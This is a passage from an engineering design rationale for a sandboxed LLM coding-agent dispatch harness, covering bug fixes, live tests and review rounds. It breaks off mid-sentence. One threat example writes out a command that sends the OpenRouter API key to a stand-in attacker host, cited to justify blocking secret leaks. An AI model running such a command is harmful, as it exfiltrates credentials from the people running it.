# simple_dispatch.py / agent_loop.py -- design rationale

Replaces `sandbox_dispatch.py` + the `opencode` CLI it drove. Two files, both
in `.claude/scripts/`:

- `agent_loop.py` -- runs INSIDE the sandbox. Talks directly to OpenRouter's
  chat-completions API (Python stdlib only, no `opencode`). One process, one
  in-memory conversation, one verify loop.
- `simple_dispatch.py` -- runs on the host. Boots a sandbox per row, copies
  in the repo + `agent_loop.py` + a brief, runs it, extracts a patch, tears
  down. A plain `ThreadPoolExecutor` fans this out over multiple rows.

No `opencode`, no plan/critic/split pipeline, no mail/wizard escalation flow.
Kept: the `msb` microsandbox + `--secret OPENROUTER_API_KEY@openrouter.ai`
primitive, which already worked and isn't the thing that was broken.

**A later adversarial re-attack on the ANALYSIS itself** (not just the code
below) found two real corrections to the bug table, applied in place with
inline notes: the discarded-verify() bug's actual scope is narrower than
first described (it's a one-step-delayed signal, not a black hole, and does
NOT explain `dense-tensor-type-build`'s specific repeated-error thrashing --
that traced to a different, already-correctly-feedback-looped code path,
so the real cause there is left honestly un-attributed rather than
re-guessed), and the credit-exhaustion and expired-key findings are likely
one underlying incident, not two independent ones. The fixes below remain
correct and worth keeping regardless -- the correction is to the causal
story for one specific example, not to whether the underlying code bugs are
real.

## Every confirmed bug class, and what specifically prevents it here

| Bug (found investigating the ~$30/day burn) | Old cause | Fix here |
|---|---|---|
| Coordinator dispatched a second process onto the same row while the first was still running, and the duplicate's `prepare_clone` `rmtree`'d the live process's own workdir out from under it | `sd-<issue_id>` container name and `/tmp/sandbox-dispatch-<issue_id>/repo` workdir were shared, unguarded, keyed only by row id -- nothing checked for a live process before dispatching | Every dispatch gets a **unique** name/workdir (`sd-<row>-<8 hex>`, a fresh `tempfile.mkdtemp()`) *and* a real OS file lock (`fcntl.flock`, non-blocking) per row id, acquired before anything is cloned or booted. Two dispatches of the same row cannot collide -- the second one exits immediately with "lock held," full stop. Verified: acquiring the same row's lock twice fails on the second attempt; releasing and re-acquiring succeeds. **Caveat (found on later re-attack, see below): the causal narrative for this incident comes from `plans/opencode-rollout.md`, the coordinator's own self-authored log -- plausible and internally consistent, but not independently verified against raw timestamps.** |
| A compile break introduced mid-"split" is discarded rather than fed back to that SAME sub-task session -- `verify()`'s return value is called and thrown away (`sandbox_dispatch.py:724`, confirmed verbatim: `verify(name, env)  # best-effort per-subtask check`) | The split-decompose pipeline's per-subtask check was never wired to anything | No pipeline to lose a signal in. `agent_loop.py` is one continuous conversation; verify happens in exactly one place and its result *always* becomes the next message. **Corrected scope (found on later re-attack): this bug is real but narrower than first described.** `run_build_cycle` (the code path that ACTUALLY ran `dense-tensor-type-build`'s 3 build turns) correctly captures `ok, tail = verify(...)` and feeds `tail` back as real feedback every turn (`sandbox_dispatch.py:552-558,594`) -- so the discarded split-verify is a one-step-delayed signal within the split phase, not a black hole, and it does NOT explain why `dense-tensor-type-build` hit the same error 3 times: that thrashing happened in a loop that already fed back the real compiler error correctly every turn. The likelier explanation for that specific row is a genuine model-capability limit (or the "do not start over" feedback wording anchoring it, unconfirmed) -- not this code bug. Left un-attributed rather than re-guessed. |
| Escalation summaries used canned praise text ("this converged close to green") regardless of what actually happened -- confirmed wrong for `dense-tensor-type-build`, which hit a byte-identical unfixed compile error on all 3 turns (this is the row's real, verified attribution -- see the correction above, where an earlier draft of this table wrongly associated the same detail with the discarded-verify bug instead) | `compose_escalation()`'s templated thesis text | No escalation-composition step exists. On failure the host gets the real, last `verify` tail, verbatim, nothing else. |
| A whole day's dispatches kept failing fast and misleadingly (looked like "zero file changes" model failures) because the OpenRouter account was out of credit -- **and the separately-described "expired API key" incident is likely the SAME underlying account-level failure surfacing under a different log signature, not an independent second bug: `plans/opencode-rollout.md`'s own text calls this "almost certainly the same underlying auth/quota failure, just without the exact string match" (found on later re-attack; not corrected as two rows before this)** | Nothing checked the account balance before dispatching; the harness's own fast-fail check existed for *some* fatal patterns but nothing ran before a sandbox was even booted | `simple_dispatch.py` calls `GET /api/v1/credits` (the account-level prepaid balance) before booting *anything*, and refuses the whole run if the balance is already exhausted. Caught and fixed a real bug in this check while building it: the first draft used `/api/v1/auth/key`'s `limit` field, which is a per-key spending cap (usually `null`/unset) and says nothing about the account's actual balance -- confirmed live against the real exhausted account, where `auth/key` reported "unlimited" while `credits` correctly showed usage $0.17 over the limit. |
| A request with no `max_tokens` gets OpenRouter's default (the model's full context window) as its theoretical ceiling, and the account-affordability check rejects the WHOLE call if it can't cover that ceiling, even when a normal-sized completion would fit fine | opencode's own request construction, not configurable from the old harness | `agent_loop.py` always sends an explicit `max_tokens` (default 4096, `--max-tokens` overridable). Confirmed live: without it, a request was rejected as unaffordable at "up to 131072 tokens"; this exists specifically to avoid that. |
| Multi-stage pipeline (GLM plan phase + cheap-model critique + per-split builds + final build turns) ran unconditionally on every row, a fixed cost regardless of whether that row needed it | Plan/critique/split apparatus had no way to skip itself for a simple task | Gone entirely. One model, one loop. **Corrected framing (found on later re-attack, attacking the architecture itself, not just line-level bugs): this row's original justification overclaimed.** It cited the repeated-identical-error thrashing as evidence the pipeline "wasn't worth it" -- but that thrashing happened inside `run_build_cycle`, a loop the pipeline never touched, and what actually stops it here is `agent_loop.py`'s STUCK detection plus its correct per-turn verify feedback -- a fix that could equally have been bolted onto the OLD `run_build_cycle` directly, independent of deleting anything upstream. The real, honest case for dropping plan/critique/split is narrower and still real: it's "never demonstrated to help" (no A/B evidence either way in this repo, only inference from watching hard cases fail) plus "a fixed tax paid on every simple row for zero benefit on simple rows" -- not "fixes the cost blowup," which is a separate change. The one piece of the removed apparatus with a plausible, unproven regression case is `split`'s "many independent files/backends" scenario (e.g. one builtin implemented across 7 backends) -- if that specific pattern actually thrashes under one growing session, that is the concrete trigger to reconsider split specifically, not devil's-advocate or the general pipeline. |
| opencode-specific operational bugs: `opencode run` hangs forever on non-TTY stdin without `< /dev/null`; `--continue` reads a stale on-disk session; `OPENCODE_MODEL` doesn't persist across invocations; `--agent plan`/`--agent build` mode selection; `opencode.jsonc` permission config needed just to run headless | All specific to depending on the `opencode` CLI's own session/config machinery | No `opencode` dependency at all. `agent_loop.py` is a single Python process holding its own message list in memory for the life of one attempt -- there is no session file, no env-var-based mode switch, no permission config to write. |

## What's deliberately NOT here (yet), on purpose

- No mail/wizard escalation flow. On failure, the host just gets the real
  tail and a patch (if one exists). A human reads it directly. Simpler by
  construction; add ceremony back only if the plain version proves
  insufficient.
- No plan-phase "search for a refactor first" step. It's not proven to have
  paid for itself, and it was itself a source of complexity/cost.
- No board.yaml coupling. `simple_dispatch.py` takes row ids + a directory of
  `<row_id>.txt` brief files directly; wiring it into the board is a
  separate, later step once the core loop is trusted.

## Verified so far (2026-09-09)

- Both files pass `py_compile`.
- `agent_loop.py`'s tool functions (`read_file`, `write_file`, `run_bash`,
  `truncate`) tested directly and behave correctly, including nested-dir
  creation on `write_file`.
- The `fcntl`-based per-row lock: acquire -> second acquire fails -> release
  -> re-acquire succeeds, confirmed directly.
- Full pipeline smoke test (real `msb` sandbox boot, real repo clone into it,
  real copy of `agent_loop.py`, real exec, real OpenRouter HTTP call,
  teardown) run end-to-end. The OpenRouter call correctly hit the account's
  real (still exhausted, confirmed via `/api/v1/credits`) balance limit and
  `agent_loop.py` correctly detected it as FATAL and exited 2, which
  `simple_dispatch.py` correctly surfaced as `fatal=True` with no retry
  wasted. This is the one bug class (blind redispatch into a dead account)
  the whole investigation identified as a real, recurring cost -- confirmed
  fixed under real conditions, not simulated ones.
- **Full real run, end to end, with actual credit**: after capping
  `max_tokens` (see above), a real request to `deepseek/deepseek-v4-flash-0731`
  went through despite the account showing negative balance -- the affordability
  check evidently has some slack for small requests. `agent_loop.py` ran a
  genuine multi-turn tool-calling session (attempt 1: 6 turns; the resulting
  `just check` hit a real, pre-existing, unrelated flaky test -- missing
  `tsc` binary in the snapshot -- and correctly reported RED with the real
  tail) and, on retry with that real failure fed back as the next message
  (attempt 2: 12 more turns), reached genuine GREEN. This is the core design
  claim -- verify always drives the next step, in one continuous session --
  validated under real conditions, not simulated ones.
- **A second real bug found by this same run, now fixed**: the task
  (`write_file` a root-level `hello.txt`) completed and verified green, but
  the file was never committed inside the sandbox. Cause: the commit step
  had copied `sandbox_dispatch.py`'s own `ensure_committed()` pattern
  verbatim -- `git add -u` (tracked files only) plus a scan for untracked
  files that filters on `grep /`, i.e. only picks up untracked files inside
  a subdirectory. A root-level new file is invisible to both halves of that
  pattern. Confirmed live (hello.txt sat as `??` in `git status` after the
  "commit" step ran) and fixed by replacing the whole thing with a plain
  `git add -A`. Re-verified directly against the still-running sandbox from
  the failed run: `git add -A && git commit` picked up hello.txt correctly,
  and `git format-patch` produced a clean, valid patch from it.
- **Not yet tested**: multi-row parallel fan-out under `ThreadPoolExecutor`
  (this run was a single row). The mechanism itself (independent per-row
  locks, independent sandboxes, independent workdirs) has no shared state to
  race on, so there's no reason to expect it behaves differently at N>1, but
  that's an inference, not a demonstrated result -- worth an explicit test
  with 3+ rows once there's more to dispatch.

## Skeptic round 1 (purely theoretical, no live testing) -- 6 issues found and fixed

1. **No explicit `--on-secret-violation`.** `msb run --help` documents no
   default for what happens when a secret leaks to a disallowed host, so a
   model-run `curl evil.com?k=$OPENROUTER_API_KEY` could exfiltrate the live
   key on whatever the undocumented default turns out to be. Now set
   explicitly to `block-and-terminate`.
2. **Non-`HTTPError` exceptions and HTTP-200-with-embedded-error bodies were
   uncaught.** A transient `URLError`/timeout crashed the whole process with
   no `VERIFIED_GREEN`/`VERIFY_FAILED`/`FATAL:` marker at all, which the host
   side would then silently read as a plain RED with no explanation. Worse:
   OpenRouter can return HTTP 200 with an `{"error": ...}` body for some
   upstream failures (including some out-of-credit conditions), which used
   to crash on an unhandled `KeyError` reading `choices[0]` -- silently
   reintroducing the exact "look like a normal failure, actually an account
   problem" bug this rewrite exists to fix. Both are now caught and
   classified explicitly before the response is trusted.
3. **The outer timeout couldn't fit the real workload.** `verify()`'s own
   ceiling is 1800s per call, but the *whole* agent_loop.py invocation (every
   retry, every turn, every verify) was ALSO wrapped in `timeout 1800` on the
   host side -- one cold-cache verify pass could consume the entire budget
   before a second retry ever got a chance, making the retry-cap silently
   unreachable on real (Rust/LLVM) work. Now a separate, generous
   `--overall-timeout` (default 5400s) sized to fit multiple verify passes
   with real slack, not rounded up from a single one.
4. **The credit preflight failed OPEN on its own errors.** Any exception
   other than a clean HTTP error (a network blip, DNS failure) let dispatch
   proceed with an unknown balance -- a softer version of the exact bug this
   check exists to prevent. Now fails CLOSED: refuses to dispatch on an
   inconclusive check rather than guessing.
5. **`workdir` (and everything in it besides the already-removed clone) was
   never cleaned up** -- a permanent per-dispatch directory leak, the same
   disk-fill shape as the old harness's worktree-target-dir incident. Patches
   now get written into `RESULT_DIR` and the whole `workdir` is removed
   unconditionally in the `finally` block.
6. **No timeout on the `git clone`/`fetch`/`checkout` calls**, unlike every
   `msb` call. A network stall there hung the worker thread -- and that row's
   lock -- indefinitely with no recovery path. Now timed out explicitly.

All six fixed in code and re-verified locally (tool functions, lock
exclusion, and the concurrent-dispatch-with-one-crash test all still pass
after the changes).

## Skeptic round 2 (purely theoretical) -- 5 more issues found and fixed

1. **The outer OS-level `timeout` kill was indistinguishable from a real
   RED** -- exactly the "operator can't tell why it failed" bug class this
   rewrite exists to fix, just relocated. Fixed properly: `agent_loop.py`
   now tracks its own wall-clock budget (`--wall-clock-budget`, checked
   before every turn) and stops CLEANLY with a distinct `OUT_OF_TIME`
   marker and exit code 3 well before the outer timeout would need to fire.
   `simple_dispatch.py` computes that budget from its own `--overall-timeout`
   (leaving room for one more verify() pass past the deadline) and passes
   it through explicitly, and classifies `OUT_OF_TIME`/RC=124/137/143 as
   their own `timed_out` category, never folded into plain RED.
2. **`messages` grew unboundedly across turns AND retry attempts**, with
   no trimming -- a long task could hit the model's own context limit,
   silently burning the rest of the retry budget on calls that could never
   succeed. Fixed with `trim_messages()`: once the conversation exceeds
   200k chars, it drops the OLDEST complete turns (never the system prompt
   or the original task message), a full assistant-message-plus-its-tool-
   replies at a time so nothing is left orphaned.
3. **`run_bash`'s 300s timeout never bounded a backgrounded process** --
   `./server & disown` returned immediately and kept running across
   retries. First fix attempt (`start_new_session=True` + `proc.communicate
   (timeout=300)` + `os.killpg` after) had a real bug caught by directly
   testing it, not just reasoning about it: `communicate()` blocks until
   the pipe's write end is closed by EVERY process that inherited it,
   including the backgrounded child -- confirmed live, a `sleep 30 &` job
   made every such call hang for the full 300s even though the foreground
   shell returned in milliseconds. Fixed by polling `proc.poll()` for the
   foreground shell's own exit, killing its process group immediately, and
   only then reading the now-EOF pipe. Verified directly: elapsed time back
   down to ~0.05s, and the specific spawned child process (tracked by pid,
   not by an ambiguous `pgrep -f` pattern that can match a test script's
   own source text) confirmed dead afterward.
4. **Unsanitized shell interpolation and no `row_id` validation** -- `model`
   was embedded unquoted into a `sh -c` string, and `row_id` (used in a lock
   file path, sandbox name, and git branch name) had no charset check, so a
   value containing `/`, `..`, or shell metacharacters was a path-traversal
   or command-injection vector. Fixed: `row_id` validated against
   `^[A-Za-z0-9_-]+$` before anything else happens, `model` (and every other
   interpolated value) passed through `shlex.quote()`.
5. **A patch got produced and returned even for FATAL/RED/TIMEOUT runs**
   with nothing marking it as such -- the same "data present, easy to
   misuse" shape as the original discarded-`verify()` bug, just moved to the
   consumer side. Fixed: the summary output now explicitly labels a non
   -GREEN patch "(UNVERIFIED, do not land)".

Minor: the per-row lock file was truncated (`open(path, "w")`) before even
attempting to acquire it, wiping the current holder's PID for anyone
inspecting it mid-contention. Fixed to open non-destructively and only
truncate+write after the lock is actually held.

All five (plus the minor one) fixed in code and re-verified: row-id
validation rejects both a path-traversal and a shell-metacharacter payload;
the lock, concurrency, and crash-isolation tests still pass with the new
`Result.timed_out` field added; the background-process fix re-tested in
isolation and confirmed the specific spawned child no longer survives.

## Skeptic round 3 (purely theoretical) -- 4 more issues found and fixed

1. **Status classification via unanchored substring match on a noisy,
   truncatable log.** `ok = "VERIFIED_GREEN" in tail` etc. checked against
   the last 8000 chars of a log that also contains model/tool output --
   `MAX_TOOL_OUTPUT` in `agent_loop.py` is exactly that same 8000, so a
   single `run_bash`/`read_file` call that happens to echo back one of
   these literal strings (e.g. `grep`-ing this very repo, which contains
   these scripts) could misclassify the outcome, and `"FATAL:"` collides
   with an ordinary panic/log-level prefix independent of this script's own
   use of it. Fixed: `agent_loop.py` now writes its outcome to a dedicated
   `/root/agent-status.txt` file via `write_status()`, touched ONLY by the
   harness itself, never by echoing model/tool content -- `simple_dispatch.py`
   reads that file exactly instead of grepping the shared log. RC=124/137/143
   is kept only as a fallback for the case the process was killed before it
   could write its own status.
2. **The identical-failure-repeats-across-retries risk -- the literal
   original headline bug (a real row hit the byte-identical compiler error
   3 times in a row) -- was bounded by `retry_cap` but never actually
   addressed.** The retry loop kept the full message history and only added
   a text instruction ("do not start over"), with no mechanism to detect or
   react to a stuck attempt. Fixed with a direct, cheap check: if an
   attempt's verify tail is byte-identical to the previous attempt's, stop
   immediately with a new, distinct `STUCK` outcome rather than spending the
   rest of the retry budget re-deriving the same dead end.
3. **Several `exec_in`/`sh` calls had no timeout**, including -- most
   seriously -- the teardown `msb rm -f` inside `_dispatch_one_locked`'s
   `finally` block. A hang there (unresponsive sandbox, host under load from
   concurrent dispatches) blocked the whole worker thread forever, which
   meant `dispatch_one`'s own `finally` (releasing the row's `flock`) never
   ran either -- permanently blocking redispatch of that row until the
   orchestrator was killed by hand. Every such call now has an explicit
   timeout.
4. **First real multi-row parallel run is still untested**, and the
   per-sandbox `-m 16G -c 4` was hardcoded, so `--parallel N` implies
   `N*16G`/`N*4` vCPU demand with no host-capacity check. Not fixed by
   testing (still blocked on real credit + a reason to run 3+ rows at once),
   but `--memory`/`--cpus` are now CLI flags instead of hardcoded, so an
   operator can size per-sandbox resources to what `--parallel` actually
   needs for their host, and the `--parallel` help text says plainly that
   this hasn't been exercised yet.

All four verified locally where testable without live credit: `write_status`
round-trips correctly, the identical-tail check fires on matching input, the
lock/concurrency/crash-isolation tests pass with the new `Result.stuck`
field and 9-argument `dispatch_one` signature.

## Skeptic round 4 (purely theoretical) -- 4 more issues, plus a structural
## verdict on the growth itself

By this round the codebase had grown from 557 to 852 lines across three fix
rounds. This round's mandate was explicitly two-fold: find new bugs, AND
give an honest verdict on whether that growth is still "as simple as
possible" or has become a risk of its own.

Bugs found:
1. **Two more `exec_in` calls had no timeout** (the log-tail read and the
   status-file read) -- the third round's own sweep, whose entire point was
   closing this gap, still missed two sites. This is itself the evidence for
   the structural verdict below: a per-call-site convention that needs
   remembering has now failed three times in a row.
2. **The wall-clock budget only accounted for ONE `verify()` call**, but
   every attempt calls `verify()` once and `retry_cap+1` attempts can each
   run a slow-but-not-hung verify near its own 1800s ceiling -- three such
   calls could exceed the total budget without the `OutOfTime` check (which
   only guards the turn loop, not `verify()`) ever catching it, landing back
   on a raw SIGKILL with the coarse RC-code fallback instead of a clean
   `TIMEOUT`.
3. **`git_head()`/`git_dirty()` had no subprocess timeout**, inconsistent
   with the rest of the file's hardening.
4. **STUCK only compared to the immediately-previous attempt's tail** --
   an oscillating failure (attempt 1 fails with A, attempt 2 with B, attempt
   3 with A again, fully reachable within the default 3-attempt budget)
   evaded detection entirely.

Fixes: `exec_in`'s `timeout` parameter now has NO default (a forgotten
timeout is an immediate `TypeError`, not a silent hang) and both missed
sites got one; `verify()` now takes an explicit `timeout` and
`agent_loop.py` caps it to whatever wall-clock budget is actually left
(skipping straight to a clean `TIMEOUT` if under 60s remain, rather than
risking a mid-verify SIGKILL); `git_head`/`git_dirty` gained a 30s timeout;
STUCK now checks the current tail against EVERY previously-seen tail this
run, not just the last one.

**On the growth itself**: the round's verdict was "simplify the *mechanism*,
don't add a fourth patch round" -- and the `exec_in` required-parameter
change is exactly that: it replaces "remember to add timeout= at every call
site" (which had already failed twice) with "the code cannot run at all
until every site has one." Line count went up again this round, but the
shape of the fix changed from another one-off patch to a structural
guarantee, which is the right direction for a codebase that's already grown
past what three rounds of individual patches could keep track of by hand.

## Skeptic round 5 (final, purely theoretical) -- 2 real bugs, verdict: ship after fixing

This round's mandate was explicitly a ship/no-ship call, not just another
bug hunt -- instructed not to manufacture a 6th round's worth of findings
just to seem thorough. It found two real, narrow bugs, both in defenses
*added by earlier rounds*, where the fix itself had an uncaught-exception
gap:

1. **A non-fatal HTTP error from OpenRouter (429 rate-limit, 500/502/503,
   a transient 400) crashed the whole process instead of being retried.**
   `call_openrouter`'s `HTTPError` branch called `check_fatal` (correctly)
   but then did a bare `raise` of the original `HTTPError` -- and
   `agent_turns` only catches `RuntimeError`, the type the *other* transient
   -error branch (`URLError`/`OSError`/`TimeoutError`) already used. A single
   429 -- plausible with `--parallel` hammering one shared key -- discarded
   the whole sandbox attempt with an uncaught traceback, never wrote a
   status file, and fell back to `simple_dispatch.py`'s RC-pattern guess,
   landing on a plain misleading "RED". Fixed: the HTTPError branch now
   wraps and raises `RuntimeError` too, exactly like its sibling branch.
2. **`verify()`'s own timeout, capped by round 4's fix to whatever
   wall-clock budget remains, raised an uncaught `subprocess.TimeoutExpired`
   when a real slow build actually hit that cap** -- crashing the process
   with no `write_status` call, in precisely the case that fix was written
   to handle cleanly. Fixed: `main()` now catches `TimeoutExpired` around
   the `verify()` call and reports it as `TIMEOUT`, same as every other path
   into that outcome.

A third, lower-severity note was also fixed: the setup calls in
`_dispatch_one_locked` (git clone/fetch/checkout, the three `msb copy`
calls, `git config`) never checked their exit code -- only the sandbox boot
itself did. A failed copy fell through silently into running the agent
against a broken environment, burning a full paid attempt on a setup bug
indistinguishable from an ordinary RED. Fixed with a small `must()` helper
(raises `SetupFailed`, caught once, turned into a `FATAL` `Result`) instead
of six repeated manual checks.

**Verdict, verbatim in spirit**: "not ready yet, but the gap is narrow and
cheap to close... this does not warrant a 6th full review round, just apply
these two fixes and ship." All three fixes applied and verified locally
(`SetupFailed`/`must()` round-trip correctly; the `HTTPError`-to-`RuntimeError`
wrap and the `TimeoutExpired` catch both confirmed present in source and
their underlying exception mechanics independently verified). This closes
the 5-round theoretical review. Total: 21 issues found and fixed across one
live smoke test and 5 rounds, 557 -> 931 lines. Remaining known gap, stated
plainly rather than glossed over: a full real multi-row parallel run is
still untested, blocked on the account's credit balance, not on any
remaining known code issue.

## STUCK-recovery: persist context, propose a narrower retry, human decides

Real validation (a 3-way parallel dispatch, `plans/dispatch-log.csv`) found
`dense-tensor-type-build` hit STUCK: 60 turns, $0.174245, and confirmed
(by reading the persisted log) it made ZERO file changes -- explored all 7
backend files extensively and never converged on an edit. That exploration
was previously thrown away entirely on any non-GREEN exit.

Went through 4 rounds of adversarial design review (not code review --
nothing existed yet) before implementing:
- **v1** (autonomous: persist -> reviewer call -> auto-edit board.yaml ->
  auto-redispatch) was killed: the resumed-attempt cost was underestimated
  (a seeded 150-200K-char context sits near `MAX_CONVERSATION_CHARS` for
  the WHOLE resumed run, unlike the original run which grows into it
  gradually, so real cost was likely $0.35-0.70+ on top of the original
  $0.17, not "cheap"); "explored but never wrote a file" isn't evidence a
  narrower task would succeed (confirmed by a real project precedent,
  `sort-by-max-by-checkpoint-1` in `plans/board.yaml`, where a human
  diagnosed an identical multi-backend-task failure as a scope problem via
  manual judgment); and most seriously, it would have added a second,
  completely UNLOCKED writer to `plans/board.yaml`, which has exactly one
  serialized writer path today (`land-lane.sh`'s `flock` on `land.lock`).
- **v2** (route the same proposal through the existing `docs/.grill/`
  human-escalation mechanism instead of auto-editing) was ALSO killed:
  `simple_dispatch.py` has zero board.yaml awareness, and `drive-tick.sh`'s
  POLICY string hardcodes how to act on each EXISTING round type by name --
  a new round type needs that integration too, which doesn't exist yet.
- **v3** (ship only what's buildable now: persist + pull + one cheap
  reviewer call + print/log the proposal, human decides by hand, zero
  automation) converged. One addition from that round's own review: trigger
  the reviewer on both STUCK and RED (retry-cap exhausted), not STUCK
  alone -- both are "gave up without succeeding," and RED may in fact be a
  *better* candidate (still finding new failures each attempt, unlike
  STUCK's proven dead end).

A further, small addition (`--resume-from`) went through its own focused
round: lets a human manually resume a persisted session with a new,
narrower instruction, specifically to catch the likely-short-lived
provider-side prompt-cache window if they act quickly -- confirmed the
round-trip is safe (every non-GREEN exit happens between turns/attempts,
never mid-turn, so a persisted `messages` list always ends on a clean role
boundary) but found a real gap: the persisted file carries no identifying
metadata, so pointing `--resume-from` at the wrong row's file under time
pressure (many similar-looking artifacts side by side in `RESULT_DIR` from
parallel dispatches) would have fed a fresh checkout a stale, unrelated
history -- worse than a cold start. Fixed with a `task_hash`
(sha256 of the original brief) persisted alongside the messages and checked
against `--original-task-file` before anything runs; a mismatch is FATAL,
not a silent guess.

**What actually shipped:**
- `agent_loop.py` persists its full `messages` list (plus `task_hash`) to
  `/root/agent-messages.json` on any non-GREEN exit (`write_status`'s
  existing single choke point, extended -- no new call sites needed beyond
  passing `messages` through).
- `simple_dispatch.py` pulls that file into `RESULT_DIR` on STUCK/RED, same
  pattern as the existing full-agent-log pull, then makes one single-shot,
  no-tool-loop, host-side reviewer call (task brief + verify tail + the
  real persisted conversation) asking `{narrowable, new_task,
  deferred_scope, reasoning}`. Best-effort throughout -- any failure here
  (network, malformed output) never blocks or delays the real dispatch
  result, matched by a real live test: a wrong/unreachable key returns a
  clean `{"narrowable": false, "reasoning": "reviewer call failed: ..."}`
  rather than raising.
- The proposal is written to `RESULT_DIR` and folded into the printed
  SUMMARY line. No board.yaml edits, no auto-redispatch, no new
  escalation/round-composition code path.
- `--resume-from`/`--original-task-file`, manual-only, threaded through
  `simple_dispatch.py`'s CLI (requires exactly one row id) down to
  `agent_loop.py`, which validates the `task_hash` before loading anything.

**Verified with real data, not just unit tests**: fed the reviewer a
synthetic-but-realistic stand-in of the actual dense-tensor-type-build
transcript (explored 7 backends, wrote nothing) against the real API --
it correctly answered `narrowable: false`, reasoning that this "is not a
scope problem... no implementation attempt was made at all," matching
exactly the concern round 1 of the design review raised about this failure
mode. Real cost: $0.000115. The `--resume-from` hash guard was verified
directly: a correct `--original-task-file` resumes cleanly (reaches the
real retry loop); a wrong one FATALs immediately with a clear message,
before any network call.

## A second review cycle: attacking the ANALYSIS as well as the code (3 rounds)

The 5-round cycle above only ever attacked the code. A further cycle
explicitly attacked the CAUSAL CLAIMS in this document too, reading primary
sources directly rather than trusting the prior summary. It found and fixed
three real issues, the third confirmed by direct reproduction, not just
argument:

1. **Two overstated/misattributed causal claims**, corrected inline above:
   the discarded-verify() bug's real scope, and the credit-exhaustion /
   expired-key double-count.
2. **The design doc had credited "dropping the plan/critique/split
   pipeline" with fixing the cost-blowup thrashing.** Corrected inline
   above: that fix is actually STUCK detection plus correct per-turn verify
   feedback, both in `agent_loop.py` -- a change that could equally have
   been bolted onto the OLD `sandbox_dispatch.py`'s `run_build_cycle`
   directly (verified: that function already tracks `attempts` with each
   one's `verify_tail` available at exactly the point a STUCK check would
   need it -- confirmed by a further skeptic round, which explicitly
   checked whether this correction was ITSELF underselling how much
   restructuring the old code would have needed, and found it wasn't).
   Dropping the pipeline is a real, separate, still-defensible
   simplification -- just not the thing that stopped the thrashing.
3. **STUCK detection itself has a real, empirically-confirmed blind spot**:
   it compared `verify()`'s raw tail for exact string equality, but
   `cargo nextest` (what `just check` actually runs) does not produce
   byte-stable output on a genuine repeat failure in this repo. Confirmed
   directly, not theoretically: a deliberately-broken test was added to the
   tree and `just check` run twice in a row against the unchanged, still
   -broken tree. The two tails differed -- parallel test scheduling changes
   which `PASS` lines land in the last 6000 characters at all (not just
   their timings), so exact-tail-equality would very likely never have
   fired on the exact "identical compiler error every attempt" pattern this
   check exists to catch. Fixed with `normalize_for_stuck_check()`:
   strips `PASS` lines, per-test timing brackets, the running position
   counter, and the inevitable truncated first line (an artifact of
   `verify()`'s fixed-size tail slice, not real content) before comparing.
   Re-verified against the exact two real logs that exposed the bug: raw
   tails differ, normalized tails match; two genuinely different synthetic
   failures still compare as different after normalization, so this isn't
   a change that would mask a real difference. The test artifact used to
   reproduce this was removed from the repo afterward -- it was never
   committed.

This cycle's own overall verdict, direct: the code and the (now
twice-corrected) design doc are honest and technically sound as far as this
review went, but the review process itself is what caught STUCK detection
being close to inert on this repo's real test command -- a gap two whole
prior rounds of both code review and analysis review missed, because the
first only read code and the second only read documents; neither actually
reproduced the mechanism end to end until this round did.

## Third review cycle: 5 rounds, split into correctness skeptic + "cost
## optimizer maniac" tracks, run in parallel each round

Requested explicitly to re-validate the design after the STUCK-recovery
feature (persist + reviewer + `--resume-from`) landed, since none of the
prior rounds had looked at that code from a pure cost lens.

### Round 1

**Cost track** -- one real, well-quantified finding: nothing detects
"exploring but never editing" mid-attempt. `agent_turns()` only checked
`git_head()`/`git_dirty()` *after* `max_turns` was fully exhausted. Real
number: `dense-tensor-type-build` burned $0.174245 across 60 turns (both
full 30-turn attempts) with **zero file changes in either one** -- almost
as expensive as `toylang-conf-yaml-build`'s successful $0.160455 GREEN run,
for no deliverable at all. The other three cost-track suspects
(`propose_narrower_task`'s 60K-char summary, `--max-tokens 4096`, STUCK
needing 2 attempts to fire) were checked against real numbers/prior
reasoning and correctly dropped as already-justified or measured-negligible
(the reviewer call's real cost is $0.000115).

Fixed: `agent_turns()` now takes `base_head` and `--max-turns-without-progress`
(default 12) and checks `git_head()`/`git_dirty()` every turn, not just at
the end of an attempt -- `max_turns_without_progress` consecutive turns
with no repo change ends the attempt early (same `None`-return path as
exhausting `max_turns`, so it flows into the existing RED/STUCK
classification with zero new states). Verified with a monkeypatched test:
threshold=5 correctly stopped after the 6th no-op turn without making a
7th API call.

**Correctness track** -- two real bugs, one minor:
1. `--resume-from` restored the conversation but never reapplied the prior
   run's own extracted patch -- the fresh clone starts at `origin/main`, so
   a resumed session's history could claim specific edits were made that
   are not actually present, risking the model spiraling over a "fix" that
   isn't there or skipping work it believes is already done. Real gap on
   any RED resume (not just a zero-change STUCK), which the recovery path
   explicitly targets both of. Fixed two ways: (a) new optional
   `--resume-patch` reapplies the prior patch via `git am` before the
   resumed session runs, refusing (via the existing `must()`/`SetupFailed`
   path) rather than silently continuing if it doesn't apply cleanly; (b)
   defense in depth regardless of (a) -- the resume continuation message no
   longer asserts "continue from your existing progress," it now tells the
   model this is a fresh checkout and to verify actual state via
   `git log`/`git diff`/`git status` before acting on memory of previous
   tool results.
2. A 200 response with missing/empty `choices` (seen from upstream
   providers on moderation blocks) sailed past the existing error-body
   check and crashed `agent_turns`'s `resp["choices"][0]` with an uncaught
   KeyError/IndexError -- past the `except RuntimeError` net, killing the
   process with a bare traceback and no `write_status` call, exactly the
   "operator can't tell why it failed" shape this rewrite exists to avoid.
   Confirmed directly (`{}["choices"][0]`, `{"choices":[]}["choices"][0]`
   both raise). Fixed: `call_openrouter` now raises the same `RuntimeError`
   the sibling error-body case does when `choices` is missing/empty.
3. Minor, already non-fatal: `proposal.get("reasoning", "")[:150]` crashes
   with `TypeError` if the model returns a literal JSON `null` for
   `reasoning` (`.get(key, default)` only substitutes on a missing key, not
   a `None` value) -- was already caught by `_dispatch_one_locked`'s own
   broad `except Exception`, just silently dropping the note. Fixed with
   `(proposal.get("reasoning") or "")[:150]`.

All four fixes verified: two with monkeypatched unit-style tests
(empty-choices RuntimeError, no-progress early exit), one by direct
argparse invocation (`--resume-patch` without `--resume-from` rejected),
one by `python3 -m py_compile` plus code inspection (the `reasoning: None`
guard is a one-line defensive change with an obvious correct form).

### Round 2

**Correctness track** -- one real bug in round 1's OWN fix, one cosmetic
nit:
1. The no-progress early-exit was comparing against a FIXED baseline
   (`base_head`, captured once before the whole retry loop) via
   `git_head() != base_head or git_dirty()`. Nothing resets the working
   tree between attempts by design, so `git_dirty()` goes true the moment
